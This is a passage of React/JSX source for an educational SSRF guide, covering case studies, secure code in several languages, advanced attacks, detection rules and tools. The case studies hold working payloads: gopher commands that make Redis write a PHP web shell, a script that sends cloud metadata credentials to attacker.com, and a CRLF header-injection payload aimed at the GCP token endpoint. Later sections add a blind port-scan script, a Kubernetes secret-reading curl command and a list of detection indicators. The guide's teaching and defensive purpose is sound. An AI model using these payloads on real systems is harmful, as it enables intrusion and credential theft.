              <li className="flex items-start">
                <span className="text-secondary-400 mr-2">•</span>
                <span>Used to access internal services including Redis</span>
              </li>
              <li className="flex items-start">
                <span className="text-secondary-400 mr-2">•</span>
                <span>Gopher protocol allowed sending arbitrary Redis commands</span>
              </li>
              <li className="flex items-start">
                <span className="text-secondary-400 mr-2">•</span>
                <span>Achieved RCE by writing web shell through Redis</span>
              </li>
            </ul>
          </div>

          <CodeBlock
            language="text"
            filename="shopify_ssrf.txt"
            code={`# Attack flow

# Step 1: Identify SSRF in image proxy
POST /api/image-proxy HTTP/1.1
Host: shopify.com
Content-Type: application/json

{"url": "http://attacker.com/test.jpg"}

# Step 2: Discover internal Redis (port 6379)
{"url": "http://127.0.0.1:6379/"}

# Step 3: Use gopher to send Redis commands
# Gopher protocol allows arbitrary TCP streams
{"url": "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a"}

# Step 4: Write web shell through Redis
{"url": "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$5%0d%0ashell%0d%0a$50%0d%0a<?php system($_GET['cmd']); ?>%0d%0a"}

# Step 5: Save to web root using Redis config
{"url": "gopher://127.0.0.1:6379/_*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a"}
{"url": "gopher://127.0.0.1:6379/_*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a"}
{"url": "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0asave%0d%0a"}

# Step 6: Execute commands
http://shopify.com/shell.php?cmd=whoami`}
          />

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">Google Cloud SSRF (Metadata Confusion)</h3>

          <div className="bg-gray-800 p-6 rounded-lg border border-blue-500 my-6">
            <p className="text-gray-300 mb-4">
              <strong className="text-blue-400">Reported:</strong> 2020
            </p>

            <p className="text-gray-300 mb-4">
              Researchers found that Google Cloud's requirement for the "Metadata-Flavor: Google" header could be bypassed in certain configurations through CRLF injection.
            </p>
          </div>

          <CodeBlock
            language="python"
            filename="gcp_ssrf_bypass.py"
            code={`# GCP normally requires special header
# curl -H "Metadata-Flavor: Google" http://metadata.google.internal/

# But CRLF injection can add headers
payload = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token%0d%0aMetadata-Flavor:%20Google%0d%0a"

# URL-encoded CRLF (%0d%0a) injects newline
# Resulting request:
# GET /computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1
# Host: metadata.google.internal
# Metadata-Flavor: Google
# [rest of headers...]`}
          />

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">Uber SSRF via PDF Generator</h3>

          <div className="bg-gray-800 p-6 rounded-lg border border-green-500 my-6">
            <p className="text-gray-300 mb-4">
              <strong className="text-green-400">Bounty:</strong> $10,000
            </p>

            <p className="text-gray-300 mb-4">
              An SSRF vulnerability in Uber's PDF receipt generation service allowed access to internal APIs and AWS metadata.
            </p>
          </div>

          <CodeBlock
            language="html"
            filename="uber_pdf_ssrf.html"
            code={`<!-- PDF generators often process HTML with external resources -->

<!-- Step 1: Embed image pointing to metadata service -->
<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">

<!-- Step 2: Use CSS to exfiltrate data -->
<style>
  @import url('http://attacker.com/exfil?data=<?php echo file_get_contents("http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"); ?>');
</style>

<!-- Step 3: JavaScript execution (if enabled) -->
<script>
  fetch('http://169.254.169.254/latest/meta-data/')
    .then(r => r.text())
    .then(data => {
      // Send to attacker's server
      fetch('http://attacker.com/log?data=' + btoa(data));
    });
</script>

<!-- Step 4: SVG with external entities -->
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://169.254.169.254/latest/meta-data/" />
</svg>`}
          />

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">Common Patterns in Bug Bounty Reports</h3>

          <div className="grid md:grid-cols-2 gap-6 my-6">
            <div className="bg-gray-800 p-5 rounded-lg border border-gray-700">
              <h4 className="text-lg font-semibold text-secondary-400 mb-3">High-Value Targets</h4>
              <ul className="space-y-2 text-sm text-gray-300">
                <li>• Webhook endpoints</li>
                <li>• Image processing services</li>
                <li>• PDF/document generators</li>
                <li>• URL preview features</li>
                <li>• RSS/feed readers</li>
                <li>• Import from URL functions</li>
              </ul>
            </div>
            <div className="bg-gray-800 p-5 rounded-lg border border-gray-700">
              <h4 className="text-lg font-semibold text-secondary-400 mb-3">High-Impact Findings</h4>
              <ul className="space-y-2 text-sm text-gray-300">
                <li>• Cloud metadata access</li>
                <li>• Internal API exposure</li>
                <li>• Database access (Redis, etc.)</li>
                <li>• File system access</li>
                <li>• RCE chain opportunities</li>
                <li>• Sensitive data exposure</li>
              </ul>
            </div>
          </div>

          <Callout type="success" title="Lessons Learned">
            These real-world examples demonstrate that SSRF is not just a theoretical vulnerability. Proper input validation, network segmentation, and least-privilege principles are critical. Organizations should assume internal networks are hostile and implement defense-in-depth strategies.
          </Callout>
        </>
      ),
    },

    {
      id: 'prevention',
      title: 'Prevention & Mitigation',
      number: '6',
      content: (
        <>
          <p className="text-lg text-gray-300 leading-relaxed">
            Preventing SSRF requires a defense-in-depth approach combining input validation, network architecture, and secure coding practices. This section provides actionable mitigation strategies for each programming language and framework.
          </p>

          <Callout type="info" title="Defense-in-Depth">
            No single defense is foolproof. Implement multiple layers of protection: input validation, network segmentation, least privilege, and monitoring.
          </Callout>

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">General Prevention Principles</h3>

          <div className="bg-gray-800 p-6 rounded-lg border border-primary-500 my-6">
            <h4 className="text-xl font-semibold text-primary-400 mb-4">1. Input Validation</h4>
            <ul className="space-y-2 text-gray-300 text-sm">
              <li>• Use allowlists, not blocklists</li>
              <li>• Validate URL scheme (http/https only)</li>
              <li>• Resolve DNS before validation</li>
              <li>• Block private IP ranges (RFC 1918)</li>
              <li>• Block cloud metadata endpoints</li>
              <li>• Validate after redirects</li>
            </ul>

            <h4 className="text-xl font-semibold text-primary-400 mb-4 mt-6">2. Network Segmentation</h4>
            <ul className="space-y-2 text-gray-300 text-sm">
              <li>• Isolate external request services</li>
              <li>• Use egress filtering</li>
              <li>• Implement network policies</li>
              <li>• Disable unnecessary protocols</li>
            </ul>

            <h4 className="text-xl font-semibold text-primary-400 mb-4 mt-6">3. Application-Level Controls</h4>
            <ul className="space-y-2 text-gray-300 text-sm">
              <li>• Disable redirects or validate destinations</li>
              <li>• Set aggressive timeouts</li>
              <li>• Limit response sizes</li>
              <li>• Remove authentication headers</li>
              <li>• Log all external requests</li>
            </ul>
          </div>

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">Secure Implementation by Language</h3>

          <h4 className="text-xl font-semibold mt-6 mb-3 text-gray-200">Python (requests, urllib)</h4>

          <div className="grid md:grid-cols-2 gap-4 my-6">
            <div>
              <p className="text-sm text-red-400 font-semibold mb-2">❌ Vulnerable Code</p>
              <CodeBlock
                language="python"
                code={`import requests

def fetch_url(url):
    # NO VALIDATION!
    response = requests.get(url)
    return response.text

# Attacker can access anything
fetch_url("http://169.254.169.254/latest/meta-data/")`}
              />
            </div>
            <div>
              <p className="text-sm text-green-400 font-semibold mb-2">✅ Secure Code</p>
              <CodeBlock
                language="python"
                code={`import requests
import socket
import ipaddress
from urllib.parse import urlparse

def is_safe_url(url):
    try:
        parsed = urlparse(url)

        # Only allow http/https
        if parsed.scheme not in ['http', 'https']:
            return False

        # Resolve hostname to IP
        hostname = parsed.hostname
        if not hostname:
            return False

        ip = socket.gethostbyname(hostname)
        ip_obj = ipaddress.ip_address(ip)

        # Block private IPs
        if ip_obj.is_private or ip_obj.is_loopback:
            return False

        # Block cloud metadata
        if ip == '169.254.169.254':
            return False

        # Optional: Domain allowlist
        allowed_domains = ['api.trusted.com']
        if hostname not in allowed_domains:
            return False

        return True
    except Exception:
        return False

def fetch_url_safe(url):
    if not is_safe_url(url):
        raise ValueError("URL not allowed")

    response = requests.get(
        url,
        timeout=5,
        allow_redirects=False,  # Disable redirects
        headers={'User-Agent': 'MyApp/1.0'}
    )

    # Limit response size
    if len(response.content) > 10 * 1024 * 1024:  # 10MB
        raise ValueError("Response too large")

    return response.text`}
              />
            </div>
          </div>

          <h4 className="text-xl font-semibold mt-6 mb-3 text-gray-200">Node.js (axios, fetch)</h4>

          <div className="grid md:grid-cols-2 gap-4 my-6">
            <div>
              <p className="text-sm text-red-400 font-semibold mb-2">❌ Vulnerable Code</p>
              <CodeBlock
                language="javascript"
                code={`const axios = require('axios');

async function fetchUrl(url) {
  // NO VALIDATION!
  const response = await axios.get(url);
  return response.data;
}

// Exploitable
fetchUrl('http://169.254.169.254/latest/meta-data/')`}
              />
            </div>
            <div>
              <p className="text-sm text-green-400 font-semibold mb-2">✅ Secure Code</p>
              <CodeBlock
                language="javascript"
                code={`const axios = require('axios');
const dns = require('dns').promises;
const { URL } = require('url');
const ipaddr = require('ipaddr.js');

async function isSafeUrl(urlString) {
  try {
    const url = new URL(urlString);

    // Only allow http/https
    if (!['http:', 'https:'].includes(url.protocol)) {
      return false;
    }

    // Resolve DNS
    const addresses = await dns.resolve4(url.hostname);

    for (const addr of addresses) {
      const ip = ipaddr.parse(addr);

      // Block private ranges
      if (ip.range() !== 'unicast') {
        return false;
      }

      // Block metadata
      if (addr === '169.254.169.254') {
        return false;
      }
    }

    // Domain allowlist
    const allowed = ['api.trusted.com'];
    if (!allowed.includes(url.hostname)) {
      return false;
    }

    return true;
  } catch (err) {
    return false;
  }
}

async function fetchUrlSafe(url) {
  if (!(await isSafeUrl(url))) {
    throw new Error('URL not allowed');
  }

  const response = await axios.get(url, {
    timeout: 5000,
    maxRedirects: 0,
    maxContentLength: 10 * 1024 * 1024, // 10MB
    headers: {
      'User-Agent': 'MyApp/1.0'
    }
  });

  return response.data;
}`}
              />
            </div>
          </div>

          <h4 className="text-xl font-semibold mt-6 mb-3 text-gray-200">PHP (cURL, file_get_contents)</h4>

          <div className="grid md:grid-cols-2 gap-4 my-6">
            <div>
              <p className="text-sm text-red-400 font-semibold mb-2">❌ Vulnerable Code</p>
              <CodeBlock
                language="php"
                code={`<?php
function fetchUrl($url) {
    // DANGEROUS!
    return file_get_contents($url);
}

// Exploitable with file://, php://, etc.
fetchUrl('file:///etc/passwd');
?>`}
              />
            </div>
            <div>
              <p className="text-sm text-green-400 font-semibold mb-2">✅ Secure Code</p>
              <CodeBlock
                language="php"
                code={`<?php
function isSafeUrl($url) {
    $parsed = parse_url($url);

    // Only allow http/https
    if (!in_array($parsed['scheme'], ['http', 'https'])) {
        return false;
    }

    $hostname = $parsed['host'];
    $ip = gethostbyname($hostname);

    // Block private IPs
    if (!filter_var($ip, FILTER_VALIDATE_IP,
        FILTER_FLAG_NO_PRIV_RANGE |
        FILTER_FLAG_NO_RES_RANGE)) {
        return false;
    }

    // Block metadata
    if ($ip === '169.254.169.254') {
        return false;
    }

    // Domain allowlist
    $allowed = ['api.trusted.com'];
    if (!in_array($hostname, $allowed)) {
        return false;
    }

    return true;
}

function fetchUrlSafe($url) {
    if (!isSafeUrl($url)) {
        throw new Exception('URL not allowed');
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 0);

    // Restrict protocols
    curl_setopt($ch, CURLOPT_PROTOCOLS,
        CURLPROTO_HTTP | CURLPROTO_HTTPS);
    curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS,
        CURLPROTO_HTTP | CURLPROTO_HTTPS);

    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode >= 300 && $httpCode < 400) {
        throw new Exception('Redirects not allowed');
    }

    return $result;
}
?>`}
              />
            </div>
          </div>

          <h4 className="text-xl font-semibold mt-6 mb-3 text-gray-200">Java (HttpURLConnection, Apache HttpClient)</h4>

          <CodeBlock
            language="java"
            filename="SafeHttpClient.java"
            code={`import java.net.*;
import java.io.*;
import java.util.*;

public class SafeHttpClient {
    private static final Set<String> ALLOWED_SCHEMES =
        new HashSet<>(Arrays.asList("http", "https"));
    private static final Set<String> ALLOWED_HOSTS =
        new HashSet<>(Arrays.asList("api.trusted.com"));

    public static boolean isSafeUrl(String urlString) {
        try {
            URL url = new URL(urlString);

            // Check scheme
            if (!ALLOWED_SCHEMES.contains(url.getProtocol())) {
                return false;
            }

            // Resolve and check IP
            String hostname = url.getHost();
            InetAddress address = InetAddress.getByName(hostname);

            // Block private IPs
            if (address.isSiteLocalAddress() ||
                address.isLoopbackAddress() ||
                address.isLinkLocalAddress()) {
                return false;
            }

            // Block cloud metadata
            if (address.getHostAddress().equals("169.254.169.254")) {
                return false;
            }

            // Domain allowlist
            if (!ALLOWED_HOSTS.contains(hostname)) {
                return false;
            }

            return true;
        } catch (Exception e) {
            return false;
        }
    }

    public static String fetchUrlSafe(String urlString) throws Exception {
        if (!isSafeUrl(urlString)) {
            throw new SecurityException("URL not allowed");
        }

        URL url = new URL(urlString);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();

        // Security settings
        conn.setInstanceFollowRedirects(false);
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);
        conn.setRequestMethod("GET");
        conn.setRequestProperty("User-Agent", "MyApp/1.0");

        int responseCode = conn.getResponseCode();
        if (responseCode >= 300 && responseCode < 400) {
            throw new SecurityException("Redirects not allowed");
        }

        // Read response with size limit
        try (BufferedReader in = new BufferedReader(
                new InputStreamReader(conn.getInputStream()))) {
            StringBuilder response = new StringBuilder();
            String line;
            int totalSize = 0;
            int maxSize = 10 * 1024 * 1024; // 10MB

            while ((line = in.readLine()) != null) {
                totalSize += line.length();
                if (totalSize > maxSize) {
                    throw new SecurityException("Response too large");
                }
                response.append(line);
            }

            return response.toString();
        }
    }
}`}
          />

          <h4 className="text-xl font-semibold mt-6 mb-3 text-gray-200">Go (net/http)</h4>

          <CodeBlock
            language="go"
            filename="safe_http.go"
            code={`package main

import (
    "fmt"
    "io"
    "net"
    "net/http"
    "net/url"
    "time"
)

var allowedHosts = map[string]bool{
    "api.trusted.com": true,
}

func isSafeURL(urlStr string) bool {
    parsedURL, err := url.Parse(urlStr)
    if err != nil {
        return false
    }

    // Only allow http/https
    if parsedURL.Scheme != "http" && parsedURL.Scheme != "https" {
        return false
    }

    hostname := parsedURL.Hostname()

    // Resolve IP
    ips, err := net.LookupIP(hostname)
    if err != nil {
        return false
    }

    for _, ip := range ips {
        // Block private IPs
        if ip.IsPrivate() || ip.IsLoopback() || ip.IsLinkLocalUnicast() {
            return false
        }

        // Block cloud metadata
        if ip.String() == "169.254.169.254" {
            return false
        }
    }

    // Domain allowlist
    if !allowedHosts[hostname] {
        return false
    }

    return true
}

func fetchURLSafe(urlStr string) (string, error) {
    if !isSafeURL(urlStr) {
        return "", fmt.Errorf("URL not allowed")
    }

    client := &http.Client{
        Timeout: 5 * time.Second,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            return http.ErrUseLastResponse // Don't follow redirects
        },
    }

    req, err := http.NewRequest("GET", urlStr, nil)
    if err != nil {
        return "", err
    }

    req.Header.Set("User-Agent", "MyApp/1.0")

    resp, err := client.Do(req)
    if err != nil {
        return "", err
    }
    defer resp.Body.Close()

    // Check for redirects
    if resp.StatusCode >= 300 && resp.StatusCode < 400 {
        return "", fmt.Errorf("redirects not allowed")
    }

    // Limit response size
    maxSize := int64(10 * 1024 * 1024) // 10MB
    body, err := io.ReadAll(io.LimitReader(resp.Body, maxSize))
    if err != nil {
        return "", err
    }

    return string(body), nil
}`}
          />

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">Cloud-Specific Mitigations</h3>

          <Callout type="success" title="AWS IMDSv2">
            Enforce IMDSv2 which requires a session token obtained via PUT request. This prevents most SSRF attacks against the metadata service.
          </Callout>

          <CodeBlock
            language="bash"
            filename="aws_imdsv2_enforce.sh"
            code={`# Enforce IMDSv2 on EC2 instances
aws ec2 modify-instance-metadata-options \\
    --instance-id i-1234567890abcdef0 \\
    --http-tokens required \\
    --http-put-response-hop-limit 1

# Launch template with IMDSv2
aws ec2 create-launch-template \\
    --launch-template-name my-template \\
    --launch-template-data '{
        "MetadataOptions": {
            "HttpTokens": "required",
            "HttpPutResponseHopLimit": 1
        }
    }'`}
          />

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">Network-Level Protections</h3>

          <CodeBlock
            language="yaml"
            filename="kubernetes_network_policy.yaml"
            code={`# Kubernetes Network Policy to block metadata access
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: block-metadata
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  # Allow DNS
  - to:
    - namespaceSelector: {}
    ports:
    - protocol: UDP
      port: 53
  # Block metadata endpoint
  - to:
    - ipBlock:
        cidr: 0.0.0.0/0
        except:
        - 169.254.169.254/32
        - 10.0.0.0/8
        - 172.16.0.0/12
        - 192.168.0.0/16`}
          />

          <Callout type="info" title="Defense in Depth">
            Combine application-level validation with network-level controls. Even if one layer fails, others provide protection. Monitor and alert on suspicious outbound connections.
          </Callout>
        </>
      ),
    },

    {
      id: 'advanced',
      title: 'Advanced Topics',
      number: '7',
      content: (
        <>
          <p className="text-lg text-gray-300 leading-relaxed">
            This section covers advanced SSRF scenarios including blind exploitation, second-order vulnerabilities, and SSRF in modern cloud-native architectures.
          </p>

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">Time-Based Blind SSRF</h3>

          <p className="text-gray-300 mb-4">
            When you can't see responses, use timing analysis to infer information:
          </p>

          <CodeBlock
            language="python"
            filename="blind_ssrf_timing.py"
            code={`import requests
import time
import statistics

def time_based_port_scan(base_url, target_ip, port):
    """
    Use timing to detect open ports in blind SSRF
    Open ports typically respond faster than filtered/closed ports
    """
    timings = []

    for _ in range(5):  # Multiple samples for accuracy
        payload = f"{base_url}?url=http://{target_ip}:{port}/"

        start = time.time()
        try:
            requests.get(payload, timeout=10)
        except requests.exceptions.Timeout:
            timings.append(10.0)  # Timeout value
        except Exception:
            pass
        elapsed = time.time() - start
        timings.append(elapsed)

    avg_time = statistics.mean(timings)
    std_dev = statistics.stdev(timings)

    # Analysis:
    # Open ports: fast response (< 1s)
    # Closed ports: immediate rejection or timeout
    # Filtered: timeout (10s)

    if avg_time < 1.5 and std_dev < 0.5:
        return "OPEN"
    elif avg_time > 8:
        return "FILTERED"
    else:
        return "CLOSED"

# Scan common ports
target = "192.168.1.100"
common_ports = [22, 80, 443, 3306, 6379, 8080]

for port in common_ports:
    status = time_based_port_scan("http://vulnerable.com/fetch", target, port)
    print(f"Port {port}: {status}")`}
          />

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">Second-Order SSRF</h3>

          <p className="text-gray-300 mb-4">
            Second-order SSRF occurs when user input is stored and later used in a server-side request without the user's direct interaction.
          </p>

          <Callout type="warning" title="Hidden Danger">
            Second-order SSRF is often overlooked because the injection point and exploitation happen at different times and locations in the application.
          </Callout>

          <CodeBlock
            language="javascript"
            filename="second_order_ssrf.js"
            code={`// Example: User profile with avatar URL

// Step 1: User sets avatar URL (stored in database)
POST /api/profile/update
{
  "avatar_url": "http://169.254.169.254/latest/meta-data/"
}

// Step 2: Later, admin views user profile
// Application fetches avatar URL server-side to generate thumbnail
GET /api/admin/users/123

// Server-side code:
async function generateThumbnail(user) {
  // VULNERABLE: Fetches user-controlled URL
  const avatarUrl = user.avatar_url;
  const response = await fetch(avatarUrl);
  const image = await response.buffer();
  return createThumbnail(image);
}

// SSRF is triggered when admin views the profile!`}
          />

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">SSRF in Microservices</h3>

          <p className="text-gray-300 mb-4">
            Cloud-native architectures introduce new SSRF attack surfaces:
          </p>

          <div className="bg-gray-800 p-6 rounded-lg border border-primary-500 my-6">
            <h4 className="text-xl font-semibold text-primary-400 mb-4">Kubernetes Service Discovery</h4>

            <p className="text-gray-300 mb-4">
              In Kubernetes, services can be accessed via DNS:
            </p>

            <CodeBlock
              language="text"
              code={`# Internal service discovery
http://service-name.namespace.svc.cluster.local

# Default namespace
http://kubernetes.default.svc.cluster.local

# Accessing Kubernetes API
http://kubernetes.default.svc.cluster.local/api/v1/namespaces
http://kubernetes.default.svc.cluster.local/api/v1/secrets

# With service account token
curl -H "Authorization: Bearer \$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \\
  https://kubernetes.default.svc.cluster.local/api/v1/namespaces/default/secrets`}
            />
          </div>

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">SSRF to RCE Chains</h3>

          <p className="text-gray-300 mb-4">
            SSRF can be chained with other vulnerabilities for maximum impact:
          </p>

          <div className="space-y-4 my-6">
            <div className="bg-gray-800 p-4 rounded-lg border-l-4 border-secondary-400">
              <h5 className="font-semibold text-secondary-400 mb-2">SSRF → Redis → RCE</h5>
              <p className="text-sm text-gray-300">
                Use gopher protocol to send Redis commands, write web shell to disk, achieve RCE
              </p>
            </div>

            <div className="bg-gray-800 p-4 rounded-lg border-l-4 border-secondary-400">
              <h5 className="font-semibold text-secondary-400 mb-2">SSRF → Elasticsearch → RCE</h5>
              <p className="text-sm text-gray-300">
                Access Elasticsearch API, exploit known CVEs, execute arbitrary code
              </p>
            </div>

            <div className="bg-gray-800 p-4 rounded-lg border-l-4 border-secondary-400">
              <h5 className="font-semibold text-secondary-400 mb-2">SSRF → Kubernetes API → Container Escape</h5>
              <p className="text-sm text-gray-300">
                Access K8s API with service account token, create privileged pod, escape to host
              </p>
            </div>

            <div className="bg-gray-800 p-4 rounded-lg border-l-4 border-secondary-400">
              <h5 className="font-semibold text-secondary-400 mb-2">SSRF → XXE → File Read → Credential Theft</h5>
              <p className="text-sm text-gray-300">
                Trigger XML parsing on internal service, exploit XXE, read sensitive files
              </p>
            </div>
          </div>

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">SSRF in Serverless Functions</h3>

          <p className="text-gray-300 mb-4">
            Serverless environments have unique SSRF risks:
          </p>

          <CodeBlock
            language="python"
            filename="lambda_ssrf.py"
            code={`# AWS Lambda function vulnerable to SSRF
import json
import urllib.request

def lambda_handler(event, context):
    # User-controlled URL from API Gateway
    url = event.get('queryStringParameters', {}).get('url')

    # VULNERABLE: No validation
    response = urllib.request.urlopen(url)
    data = response.read()

    return {
        'statusCode': 200,
        'body': json.dumps(data.decode())
    }

# Exploitation:
# GET /function?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/lambda-role

# Lambda's IAM role credentials are exposed!
# Attacker can now access all resources the Lambda has permissions for`}
          />

          <Callout type="danger" title="Serverless Risks">
            Serverless functions often have elevated permissions to access cloud resources. SSRF in serverless can lead to privilege escalation and widespread access to cloud infrastructure.
          </Callout>

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">Monitoring and Detection</h3>

          <p className="text-gray-300 mb-4">
            Implement monitoring to detect SSRF attempts:
          </p>

          <CodeBlock
            language="python"
            filename="ssrf_detection.py"
            code={`# Log and alert on suspicious patterns

import logging
from dataclasses import dataclass
from typing import List

@dataclass
class SSRFIndicator:
    pattern: str
    severity: str
    description: str

SSRF_INDICATORS: List[SSRFIndicator] = [
    SSRFIndicator("169.254.169.254", "CRITICAL", "AWS/Azure metadata access"),
    SSRFIndicator("metadata.google.internal", "CRITICAL", "GCP metadata access"),
    SSRFIndicator("127.0.0.1", "HIGH", "Localhost access"),
    SSRFIndicator("localhost", "HIGH", "Localhost access"),
    SSRFIndicator("192.168.", "HIGH", "Private IP range"),
    SSRFIndicator("10.", "HIGH", "Private IP range"),
    SSRFIndicator("file://", "CRITICAL", "File protocol"),
    SSRFIndicator("gopher://", "HIGH", "Gopher protocol"),
    SSRFIndicator("dict://", "MEDIUM", "Dict protocol"),
]

def detect_ssrf_attempt(url: str) -> List[SSRFIndicator]:
    """Detect potential SSRF in URL"""
    detected = []
    url_lower = url.lower()

    for indicator in SSRF_INDICATORS:
        if indicator.pattern.lower() in url_lower:
            detected.append(indicator)
            logging.warning(
                f"SSRF attempt detected: {indicator.description}",
                extra={
                    'url': url,
                    'severity': indicator.severity,
                    'pattern': indicator.pattern
                }
            )

    return detected

# Usage in your application
def process_url(url):
    indicators = detect_ssrf_attempt(url)

    if any(i.severity == "CRITICAL" for i in indicators):
        # Block and alert
        raise SecurityException("SSRF attempt blocked")

    if indicators:
        # Log for investigation
        logging.warning(f"Suspicious URL processed: {url}")

    # Continue with validation...`}
          />

          <Callout type="tip" title="Security Operations">
            Set up alerts for: unusual outbound connections, requests to metadata IPs, failed connection attempts to internal IPs, and suspicious User-Agent patterns from internal services.
          </Callout>
        </>
      ),
    },

    {
      id: 'tools',
      title: 'Tools & Resources',
      number: '8',
      content: (
        <>
          <p className="text-lg text-gray-300 leading-relaxed">
            This section provides a curated list of tools, resources, and references for SSRF testing and prevention.
          </p>

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">Testing Tools</h3>

          <div className="grid md:grid-cols-2 gap-6 my-6">
            <div className="bg-gray-800 p-6 rounded-lg border border-gray-700">
              <h4 className="text-xl font-semibold text-secondary-400 mb-3">Burp Suite</h4>
              <p className="text-gray-300 text-sm mb-3">
                Industry-standard web security testing platform with SSRF detection capabilities.
              </p>
              <ul className="space-y-1 text-sm text-gray-400">
                <li>• Burp Collaborator for out-of-band detection</li>
                <li>• Active/passive SSRF scanning</li>
                <li>• Custom extensions available</li>
              </ul>
            </div>

            <div className="bg-gray-800 p-6 rounded-lg border border-gray-700">
              <h4 className="text-xl font-semibold text-secondary-400 mb-3">ffuf</h4>
              <p className="text-gray-300 text-sm mb-3">
                Fast web fuzzer for discovering SSRF endpoints and testing bypasses.
              </p>
              <ul className="space-y-1 text-sm text-gray-400">
                <li>• URL parameter fuzzing</li>
                <li>• Header injection testing</li>
                <li>• Response analysis</li>
              </ul>
            </div>

            <div className="bg-gray-800 p-6 rounded-lg border border-gray-700">
              <h4 className="text-xl font-semibold text-secondary-400 mb-3">SSRFmap</h4>
              <p className="text-gray-300 text-sm mb-3">
                Automated SSRF exploitation tool with multiple protocol support.
              </p>
              <ul className="space-y-1 text-sm text-gray-400">
                <li>• Cloud metadata enumeration</li>
                <li>• Gopher/dict protocol support</li>
                <li>• Bypass payload generation</li>
              </ul>
            </div>

            <div className="bg-gray-800 p-6 rounded-lg border border-gray-700">
              <h4 className="text-xl font-semibold text-secondary-400 mb-3">interact.sh</h4>
              <p className="text-gray-300 text-sm mb-3">
                Out-of-band interaction server for blind vulnerability detection.
              </p>
              <ul className="space-y-1 text-sm text-gray-400">
                <li>• DNS/HTTP callback detection</li>
                <li>• Free hosted service</li>
                <li>• Self-hosted option available</li>
              </ul>
            </div>
          </div>

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">Security References</h3>

          <div className="space-y-4 my-6">
            <div className="bg-gray-800 p-4 rounded-lg border-l-4 border-primary-400">
              <h5 className="font-semibold text-primary-400 mb-2">OWASP SSRF Prevention Cheat Sheet</h5>
              <p className="text-sm text-gray-400">
                https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
              </p>
            </div>

            <div className="bg-gray-800 p-4 rounded-lg border-l-4 border-primary-400">
              <h5 className="font-semibold text-primary-400 mb-2">PortSwigger Web Security Academy</h5>
              <p className="text-sm text-gray-400">
                https://portswigger.net/web-security/ssrf - Interactive labs and learning materials
              </p>
            </div>

            <div className="bg-gray-800 p-4 rounded-lg border-l-4 border-primary-400">
              <h5 className="font-semibold text-primary-400 mb-2">HackerOne SSRF Reports</h5>
              <p className="text-sm text-gray-400">
                https://hackerone.com/hacktivity?querystring=ssrf - Real bug bounty reports
              </p>
            </div>

            <div className="bg-gray-800 p-4 rounded-lg border-l-4 border-primary-400">
              <h5 className="font-semibold text-primary-400 mb-2">AWS Security Best Practices</h5>
              <p className="text-sm text-gray-400">
                https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html - IMDSv2 documentation
              </p>
            </div>
          </div>

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">Further Reading</h3>

          <ul className="space-y-3 text-gray-300 my-4">
            <li className="flex items-start">
              <span className="text-secondary-400 mr-2">•</span>
              <span><strong>"A New Era of SSRF"</strong> by Orange Tsai - Advanced SSRF exploitation techniques</span>
            </li>
            <li className="flex items-start">
              <span className="text-secondary-400 mr-2">•</span>
              <span><strong>CWE-918</strong> - Common Weakness Enumeration for SSRF</span>
            </li>
            <li className="flex items-start">
              <span className="text-secondary-400 mr-2">•</span>
              <span><strong>RFC 1918</strong> - Private IP address allocation</span>
            </li>
            <li className="flex items-start">
              <span className="text-secondary-400 mr-2">•</span>
              <span><strong>Cloud Security Alliance</strong> - Cloud-specific security guidance</span>
            </li>
          </ul>

          <Callout type="success" title="Continuous Learning">
            SSRF attack and defense techniques constantly evolve. Stay updated through security blogs, conference talks (DEF CON, Black Hat), and active participation in bug bounty programs.
          </Callout>

          <div className="mt-12 p-8 bg-gradient-to-r from-primary-900 to-secondary-900 rounded-lg border border-primary-500">
            <h3 className="text-2xl font-bold text-white mb-4">Summary</h3>
            <p className="text-gray-200 mb-4">
              Server-Side Request Forgery remains one of the most impactful web security vulnerabilities. This guide has covered:
            </p>
